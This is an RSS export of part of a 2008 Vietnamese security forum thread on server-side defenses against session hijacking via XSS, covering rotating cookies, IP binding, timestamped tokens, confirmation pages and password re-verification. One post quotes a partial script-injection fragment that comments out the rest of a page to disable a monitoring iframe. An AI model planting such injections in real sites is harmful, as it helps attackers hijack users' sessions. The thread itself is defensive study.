				<pubDate><![CDATA[Thu, 6 Mar 2008 19:28:39]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ Chị Gammar .. Chị biết thì chị demo cho mọi người đi :D sao lại bảo người khác demo nhễ :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118295</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118295</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 19:28:50]]> GMT</pubDate>
				<author><![CDATA[ ThíchHắcKinh]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ Hic, sôi nổi quá, đọc mờ mắt!
Xin có ý kiến, cái này không ổn.
<p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>
2. Dựa trên cách bác conmale đề ra: sử dụng 1 cookie SID không đổi (session) và cookie động (giống như của bác conmale). Chỉ cần cookie động không hợp lệ là SID sẽ bị loại bỏ luôn. Như thế, khi nạn nhân sử dụng cookie "không còn hợp lệ" (do cách khai thác ở trên) để tạo kết nối tiếp theo cũng đồng nghĩa với việc biến cookie "hợp lệ" đang nằm trong tay kẻ tấn công thành bất hợp lệ. Nạn nhân sẽ phải đăng nhập lại để có cookie hợp lệ.
&nbsp;
		</blockquote>
Từ 1 user vô tội, khả năng gởi 1 request mang cookie cũ là có thể, nên sẽ xảy ra tình trạng mất session bất kể có XSS hay mất cắp coookie hay không.

@boom_jt:
<p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>
Tuy nhiên, với cách 2 như vừa nêu, giả sử lỗi XSS nằm ngay tại index của diễn đàn (hay trong danh sách thành viên online chẳng hạn), sẽ dẫn đến 1 vấn đề là toàn bộ thành viên sẽ ko thể vào đc diễn đàn, vì cookie của họ liên tục trở thành bất hợp lệ!
&nbsp;
		</blockquote>
Mình chưa hiểu rõ vì sao "cookie của họ liên tục trở thành bất hợp lệ!"

<p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote>
@vivashadow:
Attacker dễ dàng inject cái script này để disable nguyên đoạn mã html phía dưới, trong đó có cả cái iframe chứa ping.jsp của HVA
<blockquote>&lt;script&gt;window.open() .....&lt;/script&gt;&lt;!-- &nbsp;
		</blockquote>
&nbsp;
		</blockquote>
Làm vậy thì bứt dây động rừng quá, cấu trúc trang web sẽ bị vỡ và mất nội dung.
Hoặc sẽ chống bằng 1 dòng &lt;!----&gt; :D
]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118299</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118299</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 19:40:25]]> GMT</pubDate>
				<author><![CDATA[ vivashadow]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ @vivashadow: tui demo vậy thôi, thực tế thằng hacker nó chèn một đoạn html bottom y chang đăng sau, cuối thẻ &lt;/html&gt; nó mới phang thêm cái &lt;!-- ... Như vầy là ko bị vỡ cấu trúc nhé :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118303</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118303</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 19:52:48]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ @gammar95: ừ không vỡ. Nhưng nếu xài &lt;!----&gt; hoặc chuối hơn là để đoạn iframe lên đầu trang cũng dc mà ;)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118305</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118305</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 20:03:33]]> GMT</pubDate>
				<author><![CDATA[ vivashadow]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ "Con gián" của gamma hại nhỉ? ;)

Anyway, tôi cho rằng, mọi hành động điều chỉnh cookie, như cách anh conmale đề cập, chỉ là những "mánh mung", hòng gây thêm khó khăn cho kẻ tấn công, chứ không phải là một giải pháp triệt để.

Hơi off-topic, tôi nghĩ có lẽ chúng ta đang xác định sai vấn đề cần giải quyết, nên các giải pháp đưa ra đều khó lòng mà triệt để. Vấn đề mà chúng ta cần giải quyết ở đây không phải là xác thực người dùng (user authentication, như mọi người vẫn đang cố gắng triển khai, thông qua các hình thức cookie, username, password, token...), mà phải là xác thực từng hành động mà người dùng thực thi trên hệ thống (transaction authentication).

Tôi đưa ra một ví dụ về sự thất bại của chiến thuật xác thuật người dùng. Ngay ở HVAOnline, trước đây, JForum bị dính một lỗi CSRF (có một topic về đề tài này trên HVAOnline), anh conmale mới triển khai một kiểu securityHash, là một hidden field trong mấy cái form trên HVAOnline. securityHash giải quyết được CSRF cho đến khi gamma, với sự cố "con gián" :-d, đã chôm được luôn cookie (và thật ra khi đã bị XSS rồi, thì securityHash kô còn có tác dụng nữa) và từ đó chiếm luôn session của những người nào mải mê "bắt gián".

Rõ ràng, các phương thức xác thực như cookie, session hay securityHash không phải là giải phát triệt để để bảo đảm an ninh cho phía server, ngăn ngừa những tổn hại có thể xảy ra với server trong trường hợp credential của user bị đánh cắp. Đó là tôi chưa kể đến những vấn đề như MITM trojan có khả năng chôm credential của user một cách tự động và "trong suốt" luôn. Tóm lại, từ máy tính của người dùng đến server, có quá nhiều cạm bẫy và rủi ro có thể khiến người dùng bị chôm mất credential của mình.

Do đó, tôi nghĩ bây giờ phải assump là, người dùng sẽ bị chôm credential, trong trường hợp này là attacker có thể tạo ra một request hoàn toàn bình thường như người dùng. Câu hỏi là có cách nào kiểm tra request đó ở phía server hay không?

Có nhiều cách, tùy theo từng hoàn cảnh, chẳng hạn như:

- đối với các hệ thống tài chính, ngân hàng, họ đều triển khai một hệ thống gọi là "fraud detection system", tạm dịch là hệ thống phát hiện gian lận. Hệ thống này được xây dựng dựa trên nền tảng của AI, có khả năng tìm hiểu, phân tích, học và adapt theo thói quen của người dùng.

Ví dụ như họ phân tích thói quen tiêu tiền của tôi là lần nào cũng rút tiền từ ATM ra cao lắm là 2 triệu, tại một trong 2 máy ATM gần chỗ làm. Nếu một ngày nào đó, tự nhiên ai đó rút ra hết tiền của tôi, tại một máy ATM ở...Lạng Sơn chẳng hạn, hệ thống sẽ báo động và ngừng giao dịch đó lại.

Đương nhiên xây dựng một hệ thống như thế đòi hỏi tiền bạc, thời gian, nhân lực và rõ ràng là không thể áp dụng cho HVAOnline.

- đối với một hệ thống như HVAOnline, chúng ta có thể điều chỉnh bằng các rule, chẳng hạn như:

+ ủy thác thực hiện các chức năng quan trọng vào một lớp IP nhất định.

+ trước khi thực hiện bất kỳ chức năng nào, phải verify lại mật khẩu.

+ tách bạch giữa account quản lý và account sinh hoạt trên diễn đàn (chẳng hạn như "quanlytruong")

+ ...



Sorry mọi người, hơi bị off-topic ;).

-m
]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118320</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118320</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 21:48:28]]> GMT</pubDate>
				<author><![CDATA[ mrro]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Hay lắm Thái.

Thực ra các phương pháp ngăn ngừa hiện tại của HVA là khá strictly; khó có thể thực hiện với 1 website cho người dùng bình thường (in term of usability).]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118331</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118331</link>
				<pubDate><![CDATA[Fri, 7 Mar 2008 00:03:49]]> GMT</pubDate>
				<author><![CDATA[ safari]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Em có 1 ý kiến thế này , ko biết có wá chuối ko  :D 

Khi client login vào forum và gởi 1 request tới server , server sẽ xác nhận tính chất User Authentication của request đó , sau đó request lại client yêu cầu để biết thông tin chính xác của client về IP hiện tại của client , và quá trình này sẽ lập lại trong suốt phiên duyệt web

Khi có 1 request khác tới , nó sẽ xác nhập thông tin về IP của client , nếu có 1 sự thay đổi IP , server sẽ yêu cầu client đăng nhập lại ? Với cách làm này , dù Attacker có lấy dc HTTP header thì cũng ko làm dc jì vì ko thể thay đổi IP đươc ? Em nghĩ là như thế  :D Nếu wá chuối xin mọi người thứ lỗi ^^]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118339</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118339</link>
				<pubDate><![CDATA[Fri, 7 Mar 2008 00:41:37]]> GMT</pubDate>
				<author><![CDATA[ Choen]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">Choen wrote:</cite><br>
		<blockquote>
Khi có 1 request khác tới , nó sẽ xác nhập thông tin về IP của client , nếu có 1 sự thay đổi IP , server sẽ yêu cầu client đăng nhập lại ?...&nbsp;
		</blockquote>

Công ty tui xài out-bound Load-balancer, nên không có gì đảm bảo 2 request khác nhau sẽ có cùng một IP. Chẳng lẽ tui phải login lại hoài luôn à??? :-/ 

Phương pháp mà bạn nói thì tụi register.com cũng dùng, làm mỗi lần trong cty muốn xài website của tụi này là điên luôn  :-S]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118343</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118343</link>
				<pubDate><![CDATA[Fri, 7 Mar 2008 01:23:33]]> GMT</pubDate>
				<author><![CDATA[ safari]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Có thể áp dụng với 1 số account đặc biệt , tuy hơi phiền 1 chút nhưng đảm bảo ko bi hijack ^^]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118356</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118356</link>
				<pubDate><![CDATA[Fri, 7 Mar 2008 07:45:37]]> GMT</pubDate>
				<author><![CDATA[ Choen]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">mrro wrote:</cite><br>
		<blockquote>"Con gián" của gamma hại nhỉ? ;)

Anyway, tôi cho rằng, mọi hành động điều chỉnh cookie, như cách anh conmale đề cập, chỉ là những "mánh mung", hòng gây thêm khó khăn cho kẻ tấn công, chứ không phải là một giải pháp triệt để.
&nbsp;
		</blockquote>
Hì hì, mục đích đằng sau là để tìm hiểu những giới hạn của giao thức HTTP hiện nay trong phạm vi session management đó em :). Cái này quan trọng và lý thú hơn chỉ dừng lại ở mức "quick fix".

<p></p>
		<cite class="blockquote">mrro wrote:</cite><br>
		<blockquote>
Hơi off-topic, tôi nghĩ có lẽ chúng ta đang xác định sai vấn đề cần giải quyết, nên các giải pháp đưa ra đều khó lòng mà triệt để. Vấn đề mà chúng ta cần giải quyết ở đây không phải là xác thực người dùng (user authentication, như mọi người vẫn đang cố gắng triển khai, thông qua các hình thức cookie, username, password, token...), mà phải là xác thực từng hành động mà người dùng thực thi trên hệ thống (transaction authentication).
&nbsp;
		</blockquote>
Điểm này hoàn toàn đúng. Tuy vậy, vấn đề nằm ở chỗ xác định sự cân bằng giữa đòi hỏi bảo mật và tiện dụng của một ứng dụng. Một ứng dụng online banking cần "transaction authentication" là điều cần thiết bởi vì mỗi cú bấm đều critical. Đối với một forum, tính critical không cao đến thế. Nếu đặt tính critical của một forum lên mức đòi hỏi "transaction authentication" thì nó bị mất tính linh động và dễ dùng.

Đứng về mặt technology, mình có thể vận dụng nhiều phương pháp để giải quyết tình trạng hijacking. Cái khó là duy trì được mức transparent và friendly trong quá trình sử dụng.

<p></p>
		<cite class="blockquote">mrro wrote:</cite><br>
		<blockquote>
Tôi đưa ra một ví dụ về sự thất bại của chiến thuật xác thuật người dùng. Ngay ở HVAOnline, trước đây, JForum bị dính một lỗi CSRF (có một topic về đề tài này trên HVAOnline), anh conmale mới triển khai một kiểu securityHash, là một hidden field trong mấy cái form trên HVAOnline. securityHash giải quyết được CSRF cho đến khi gamma, với sự cố "con gián" :-d, đã chôm được luôn cookie (và thật ra khi đã bị XSS rồi, thì securityHash kô còn có tác dụng nữa) và từ đó chiếm luôn session của những người nào mải mê "bắt gián".

Rõ ràng, các phương thức xác thực như cookie, session hay securityHash không phải là giải phát triệt để để bảo đảm an ninh cho phía server, ngăn ngừa những tổn hại có thể xảy ra với server trong trường hợp credential của user bị đánh cắp. Đó là tôi chưa kể đến những vấn đề như MITM trojan có khả năng chôm credential của user một cách tự động và "trong suốt" luôn. Tóm lại, từ máy tính của người dùng đến server, có quá nhiều cạm bẫy và rủi ro có thể khiến người dùng bị chôm mất credential của mình.
&nbsp;
		</blockquote>
Ở giới hạn forum và ưu tiên cao nhất là hiệu suất + thân thiện, việc ứng dụng bất cứ phương pháp nào khả thi để giảm thiểu dung hại là việc cần thiết. Điểm em đưa ra đây chính là cốt lõi của vấn đề mà mình nên nắm lấy: <b>hạn chế của giao thức và cơ chế quản lý session xuyên qua HTTP</b>. HTTP được tạo ra nhằm phục vụ stateless request / response. Cho đến khi nó được phổ biến, dựa trên giao thức khá "primitive" thời ấy, các công nghệ ứng dụng mới tìm cách khai thác và mở rộng cái hạn chế "stateless" kia. XSS và CSRF được khám phá và exploit mãi sau này. Bởi thế, cho đến lúc này, dựa trên căn bản primitive HTTP để duy trì một session và bảo đảm tính bảo mật là điều khó thực hiện được (nếu không muốn áp đặt những cơ chế kém thân thiện).

<p></p>
		<cite class="blockquote">mrro wrote:</cite><br>
		<blockquote>
Do đó, tôi nghĩ bây giờ phải assump là, người dùng sẽ bị chôm credential, trong trường hợp này là attacker có thể tạo ra một request hoàn toàn bình thường như người dùng. Câu hỏi là có cách nào kiểm tra request đó ở phía server hay không?

Có nhiều cách, tùy theo từng hoàn cảnh, chẳng hạn như:

- đối với các hệ thống tài chính, ngân hàng, họ đều triển khai một hệ thống gọi là "fraud detection system", tạm dịch là hệ thống phát hiện gian lận. Hệ thống này được xây dựng dựa trên nền tảng của AI, có khả năng tìm hiểu, phân tích, học và adapt theo thói quen của người dùng.

Ví dụ như họ phân tích thói quen tiêu tiền của tôi là lần nào cũng rút tiền từ ATM ra cao lắm là 2 triệu, tại một trong 2 máy ATM gần chỗ làm. Nếu một ngày nào đó, tự nhiên ai đó rút ra hết tiền của tôi, tại một máy ATM ở...Lạng Sơn chẳng hạn, hệ thống sẽ báo động và ngừng giao dịch đó lại.
&nbsp;
		</blockquote>
Cái này có thể bị kẹt trong context banking. Ví dụ anh đang ở Sydney, thỉnh thoảng anh dùng thẻ để rút tiền ở vài ATM nào đó tại Sydney. Ngày kia anh đi hội nghị ở Sing, anh cần tiền và bị ngưng giao dịch như thế là chết anh ;).

<p></p>
		<cite class="blockquote">mrro wrote:</cite><br>
		<blockquote>
Đương nhiên xây dựng một hệ thống như thế đòi hỏi tiền bạc, thời gian, nhân lực và rõ ràng là không thể áp dụng cho HVAOnline.

- đối với một hệ thống như HVAOnline, chúng ta có thể điều chỉnh bằng các rule, chẳng hạn như:

+ ủy thác thực hiện các chức năng quan trọng vào một lớp IP nhất định.

+ trước khi thực hiện bất kỳ chức năng nào, phải verify lại mật khẩu.

+ tách bạch giữa account quản lý và account sinh hoạt trên diễn đàn (chẳng hạn như "quanlytruong")

+ ...
&nbsp;
		</blockquote>
Điểm thứ 1 ok, đã áp dụng (như điểm thứ 3).
Điểm thứ 2 hơi kẹt ;).
Điểm thứ 3 gần giống điểm thứ 1.

Hầu hết các chức năng quan trọng đều nằm trong administrator account và nó được "quản chế" khá chặt. Các account moderators có thể làm được một số công tác quan trọng khác nhưng không thể làm hàng loạt được :). Đây là nguyên tắc bảo mật căn bản.


<p></p>
		<cite class="blockquote">mrro wrote:</cite><br>
		<blockquote>
Sorry mọi người, hơi bị off-topic ;).

-m
&nbsp;
		</blockquote>
Đâu có. Ý kiến của em rất giá trị và không hề off-topic :).

Thân.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118389</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118389</link>
				<pubDate><![CDATA[Fri, 7 Mar 2008 12:10:28]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Cho mình hỏi vài điều sau:
1_ Tại sao gọi là "từ phía server" ?
2_ Nếu không dùng Cookies thì không bị lỗi này đúng không ?
3_ Mình đề cử thử cách sau xem có được không ?

Đầu tiên là: kiểm tra Session("str") = Cookies("str") ở ngay đầu trang, nếu đúng sẽ cho duyệt tiếp, ngược lại, chuyển về trang default.asp, trang này sẽ tạo 1 chuỗi random và lưu vào cả session và cookies, đồng thời xác lập lại thông tin mới cho cookies, dựa vào các điều kiện hiện hành.

Các file trong 1 ứng dụng đều include đoạn kiểm tra trên.
Cuối trang, tạo 1 chuỗi random mới và thay thế vào session("str") và cookies("str").

Lý giải của mình như sau: (theo mình nghĩ)
+ Đối với User thật: điều kiện kiểm tra đầu tiên luôn đúng. Hoặc ít nhất, cỡ nào cũng sẽ đúng.
+ Đối với User giả: nếu lấy được cookies (vẫn sẽ là cookies cũ), vì đến cuối trang, nó đã replace lại giá trị của cookies này, và giá trị của cookies luôn bị thay đổi sau mỗi lần kiểm tra.
Viết tới đây tự dưng thấy vô lý, cookies thường dùng để lưu thông tin để đăng nhập tự động vào lần sau. Nếu đem đi kiểm tra với session thì cũng như không, nhưng vẫn để bài viết đó, mong mọi người góp ý thêm.

4_ Nếu có bộ lọc tốt(Chỉ cần lọc đầu vào), thì đã gọi là an toàn chưa? Đừng hỏi lọc thế nào gọi là tốt, chủ yếu là các cú pháp nào dùng để lấy cookies thì lọc hết, lọc luôn cả ( ' + ' ) thành "" để tránh dùng 'coo' + 'kies',... tương tự thế.

________________________________________________________
///
N e W b I e
///]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118500</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118500</link>
				<pubDate><![CDATA[Sat, 8 Mar 2008 00:38:06]]> GMT</pubDate>
				<author><![CDATA[ 0x111111]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Chào cả nhà,

Mấy hôm nay thấy topic sôi động ghê mà bận quá ko thể tham gia thảo luận được với mọi người. Bây giờ mới có thể vào "góp vui" cùng bà con chút xíu :).

<p></p>
		<cite class="blockquote">conmale wrote:</cite><br>
		<blockquote>Hì hì, mục đích đằng sau là để tìm hiểu những giới hạn của giao thức HTTP hiện nay trong phạm vi session management đó em . Cái này quan trọng và lý thú hơn chỉ dừng lại ở mức "quick fix".&nbsp;
		</blockquote>
Hi hi, anh <i>conmale</i> coi bộ muốn bà con "xới tung" <i>HTTP & its related stuff</i> lên mới đã hay sao đó mà đặt giả thiết bài toán khó nhằn ghê :P. Thành thực mà nói, do bản chất "vốn có" của HTTP là một stateless protocol nên vô hình chung dẫn tới bài toán Session Management trở nên cầu kỳ, phức tạp. Bất kỳ một Web application nào khi có nhu cầu đụng tới vấn đề authentication thì hầu như phải tự thêm thắt các phương pháp "tự chế" (đối với context trong topic này là các thứ khá quen thuộc như cookies, sessionID, securityHash,...) nhằm mục đích "tha thiết" là: xác thực/định danh người dùng.

<p></p>
		<cite class="blockquote">conmale wrote:</cite><br>
		<blockquote>Điểm này hoàn toàn đúng. Tuy vậy, vấn đề nằm ở chỗ xác định sự cân bằng giữa đòi hỏi bảo mật và tiện dụng của một ứng dụng. Một ứng dụng online banking cần "transaction authentication" là điều cần thiết bởi vì mỗi cú bấm đều critical. Đối với một forum, tính critical không cao đến thế. Nếu đặt tính critical của một forum lên mức đòi hỏi "transaction authentication" thì nó bị mất tính linh động và dễ dùng. 

Đứng về mặt technology, mình có thể vận dụng nhiều phương pháp để giải quyết tình trạng hijacking. Cái khó là duy trì được mức transparent và friendly trong quá trình sử dụng.&nbsp;
		</blockquote>
Um, thiết nghĩ anh <i>conmale</i> có vẻ quá "trăn trở" về vấn đề transparent & friendly trong khuôn khổ forum nên khó có thể đạt được một giải pháp "dĩ hoà vi quý". Vì xét cho cùng, trên một forum, các tác vụ quan trọng nhất, đáng để "lừa" nhất, là các tác vụ điều hợp (của mods) nên việc verify lại mật khẩu là điều nên làm trong trường hợp cần thiết.

Em nghĩ có thể kết hợp thêm yếu tố <b>Timestamp</b> (chẳng hạn, khoảng 30 giây) cho securityHash/token (có tính duy nhất cho 1 session) hiện tại của diễn đàn. Theo đó, phía server sẽ lưu giữ một table các securityHash này và sẽ không chấp nhận một request nào đó nếu giá trị securityHash đã và đang được dùng trước đó. Table này sẽ chỉ lưu các securityHash trong khoảng thời gian của Timestamp sau đó sẽ được giải phóng mà không chiếm tài nguyên.

Trong trường hợp nhận được 2 requests với 2 securityHash giống nhau (bị session hijack), khi đó server-side nên cân nhắc trường hợp reject cả hai request này (vì khi đó không rõ request nào là hợp lệ) hoặc tiến hành verify lại password.
<p></p>
		<cite class="blockquote">mrro wrote:</cite><br>
		<blockquote>
Do đó, tôi nghĩ bây giờ phải assump là, người dùng sẽ bị chôm credential, trong trường hợp này là attacker có thể tạo ra một request hoàn toàn bình thường như người dùng. Câu hỏi là có cách nào kiểm tra request đó ở phía server hay không? 

Có nhiều cách, tùy theo từng hoàn cảnh, chẳng hạn như: 

- đối với các hệ thống tài chính, ngân hàng, họ đều triển khai một hệ thống gọi là "fraud detection system", tạm dịch là hệ thống phát hiện gian lận. Hệ thống này được xây dựng dựa trên nền tảng của AI, có khả năng tìm hiểu, phân tích, học và adapt theo thói quen của người dùng. 

Ví dụ như họ phân tích thói quen tiêu tiền của tôi là lần nào cũng rút tiền từ ATM ra cao lắm là 2 triệu, tại một trong 2 máy ATM gần chỗ làm. Nếu một ngày nào đó, tự nhiên ai đó rút ra hết tiền của tôi, tại một máy ATM ở...Lạng Sơn chẳng hạn, hệ thống sẽ báo động và ngừng giao dịch đó lại.&nbsp;
		</blockquote>
Đúng là bài toán authentication chỉ có thể được giải quyết rốt ráo khi không còn phụ thuộc vào việc authenticate users nữa mà thay vào đó là authenticate nội dung giao dịch. Tuy nhiên, để có giải pháp hoàn thiện dựa trên AI, vấn đề thời gian & nghiên cứu nên được đầu tư một cách nghiêm túc. Lý do, nếu hệ thống không được "training" tốt, không lựa chọn được <b>AI learning algorithms</b> tốt, thì khả năng chịu <b>false positive</b> là không thể tránh khỏi.

Mến.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118507</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118507</link>
				<pubDate><![CDATA[Sat, 8 Mar 2008 00:53:35]]> GMT</pubDate>
				<author><![CDATA[ prof]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Qua 1 thời gian trao đổi thì mình thấy thế này: vấn đề là ở chỗ bản chất của HTTP - stateless protocol - và cũng theo như anh conmale có mạnh dạn đề ra việc "cải tổ" giao thức. Vậy nên chăng chèn thêm 1 tầng "đệm" vào dưới tầng Application để biến HTTP thành giao thức có trạng thái? 
Việc làm này có hợp lý ko khi mà TCP - tầng ngay dưới đã cung cấp 1 kết nối từ điểm tới điểm - có trạng thái?
Đồng thời, nó có giải quyết đc triệt để session hijacking ko trong trường hợp kẻ tấn công cũng chọc sâu xuống tận tầng đệm đó để khai thác (lập trình socket chẳng hạn) ?

các bạn cho ý kiến nha

p/s: @prof: mình chưa hiểu rõ lắm ý tưởng timestamp của bồ, có thể nói rõ thêm cho mình hiểu chút đc ko, sozy :)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118520</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118520</link>
				<pubDate><![CDATA[Sat, 8 Mar 2008 01:41:04]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ Không phải không muốn <font color='orange'>cải tổ</font>, HTTP là giao thức quá phổ biến và thiết yếu nên người ta luôn cố cải tiến nó đấy chứ. Nhưng chính vì tính chất đơn giản, nhanh, phổ biến và mục đích cơ bản từ nguyên thủy của nó chỉ là để tra cứu thông tin nên có cố gắng bao nhiêu thì HTTP vẫn là HTTP nếu thay đổi quá như boom_jt thì có lẽ HTTP sẽ thành 1 giao thức khác, hoặc chí ít phải đánh đổi các tính chất cơ bản của giao thức, cho nên trước mắt vẫn phải <font color='red'>tự chế</font> thôi. 

Một nguyên nhân nữa làm ứng dụng web bảo mật kém nữa là Javascript, bản thân JS mang lại nhiều sức mạnh cho web nhưng cũng gây thêm nhiều khó khăn bảo mật cùng với HTML vốn đã là ngôn ngữ thẻ lỏng lẻo.
<font color='yellow'>Javascript's biggest weakness is that it is not secure - douglas crockford</font>
<span class="link"> http://www.slideshare.net/jharwig/javascript-security/</span>

Hơi lạc đề nhưng cũng xin bao quát lại 1 chút là hướng cải thiện bây h (XSS nói chung ) là: phía server thì phải liên tục phát hiện và lấp XSS,  phía client thì gia cố bảo mật trình duyệt (như là dùng HttpOnly, trusted domain), nâng cấp js/html.
]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118531</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118531</link>
				<pubDate><![CDATA[Sat, 8 Mar 2008 03:59:27]]> GMT</pubDate>
				<author><![CDATA[ vivashadow]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">conmale wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">mrro wrote:</cite><br>
		<blockquote>
Đương nhiên xây dựng một hệ thống như thế đòi hỏi tiền bạc, thời gian, nhân lực và rõ ràng là không thể áp dụng cho HVAOnline.

- đối với một hệ thống như HVAOnline, chúng ta có thể điều chỉnh bằng các rule, chẳng hạn như:

+ ủy thác thực hiện các chức năng quan trọng vào một lớp IP nhất định.

+ trước khi thực hiện bất kỳ chức năng nào, phải verify lại mật khẩu.

+ tách bạch giữa account quản lý và account sinh hoạt trên diễn đàn (chẳng hạn như "quanlytruong")

+ ...
&nbsp;
		</blockquote>
Điểm thứ 1 ok, đã áp dụng (như điểm thứ 3).
Điểm thứ 2 hơi kẹt ;).
Điểm thứ 3 gần giống điểm thứ 1.

Hầu hết các chức năng quan trọng đều nằm trong administrator account và nó được "quản chế" khá chặt. Các account moderators có thể làm được một số công tác quan trọng khác nhưng không thể làm hàng loạt được :). Đây là nguyên tắc bảo mật căn bản.&nbsp;
		</blockquote>
Điểm thứ 2 của Thái không phải là không hữu dụng. Mình có thể chia ra làm 2 cấp:
* Cấp đầu tiên: Mọi action "nguy hiểm" đều phải qua 1 bước đệm để confirm, và action cuối cùng chỉ được thực hiện thông qua 1 POST request. Ví dụ, khi xóa bài viết, thay vì hiển thị lên cái pop-up javascript "Are you sure?", thì mình làm 1 page Confirm "Are you sure?" từ server side. Và khi click "Yes" sẽ POST request lên server. Cách làm này có nhiều lợi điểm:
- Không giảm thiểu mấy về mặt <b>tiện dụng</b>. Hiện thêm 1 cái confirmation để hỏi Yes/No cho các tác vụ nguy hiểm như delete chẳng hạn thì sẽ không có ai than phiền gì đâu; mà có khi còn được hoan nghênh nữa là khác ;-)
- Cản được khá nhiều các tấn công kiểu cross-site. Vì thứ nhất wwwect trong HTTP không hỗ trợ POST; sẽ giảm thiểu được kiểu tấn công bằng cách wwwect qua/lại giữa các node (pc của hva user, server hva, server/pc của attacker). Thứ hai, mình có thể lợi dụng cái trang confirmation đệm ở giữa này để tạo 1 security token riêng cho cái action đó; như vậy attacker có send được 1 cái POST request đến server HVA thì cũng gặp khó khăn hơn vì cái security token này attacker cũng khó mà có được.

* Cấp thứ 2 là làm thêm 1 ô verify password ở cái trang "Are you sure?". Xét về mặt tiện dụng thì có hơi bất tiện 1 chút. Nhưng giả sử với 1 action nguy hiểm như "delete sạch 1 box của diễn đàn (và có thể các box con của nó)" thì thêm 1 ô verify password cũng đâu có gì là quá đáng :-)

Và cái điểm thứ 2 của Thái này anh Diêu cũng đã dùng 5-6 năm nay ở diễn đàn mình rồi (mọi tác vụ đều phải nhập username/password và POST), có gì "kẹt" đâu :-)

